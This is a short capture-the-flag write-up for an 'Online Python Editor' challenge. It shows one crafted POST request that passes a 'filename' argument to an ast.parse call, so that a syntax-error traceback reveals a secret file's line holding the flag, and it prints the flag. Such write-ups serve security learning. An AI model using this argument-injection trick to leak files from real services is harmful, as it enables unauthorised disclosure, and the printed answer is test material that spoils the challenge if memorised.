# Online Python Editor
Solved by: 

### Question:
If you're tired of fast and good-looking editors, try this.

Now with extra crispiness!

### Solution:
1. Send a POST request to the URL with the payload

```
POST http://python.ctf.theromanxpl0.it:7001/check
{
  "source": "main()\nmain()\nmain()\n\n\ninvalid syntax\n\n",
  "filename": "secret.py"
}

resp:
{
  "error": "Traceback (most recent call last):\n  File \"/app/app.py\", line 14, in check\n    ast.parse(**request.json)\n    ~~~~~~~~~^^^^^^^^^^^^^^^^\n  File \"/usr/local/lib/python3.13/ast.py\", line 54, in parse\n    return compile(source, filename, mode, flags,\n                   _feature_version=feature_version, optimize=optimize)\n  File \"secret.py\", line 6\n    FLAG = \"TRX{4ll_y0u_h4v3_t0_d0_1s_l00k_4t_th3_s0urc3_c0d3}\"\n            ^^^^^^\nSyntaxError: invalid syntax\n",
  "status": false
}
```

**Flag:** `TRX{4ll_y0u_h4v3_t0_d0_1s_l00k_4t_th3_s0urc3_c0d3}`